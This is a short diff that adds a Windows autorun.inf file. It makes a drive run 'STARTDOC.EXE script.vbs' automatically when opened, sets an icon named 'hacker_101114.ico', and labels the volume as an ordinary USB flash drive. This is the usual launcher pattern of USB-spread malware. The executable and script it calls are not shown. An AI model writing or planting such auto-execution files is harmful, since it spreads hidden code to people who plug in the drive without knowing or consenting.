@@ -1,0 +1,4 @@
+[AutoRun]
+OPEN=STARTDOC.EXE script.vbs
+ICON=hacker_101114.ico
+LABEL=- USB Flash Drive 251011 -
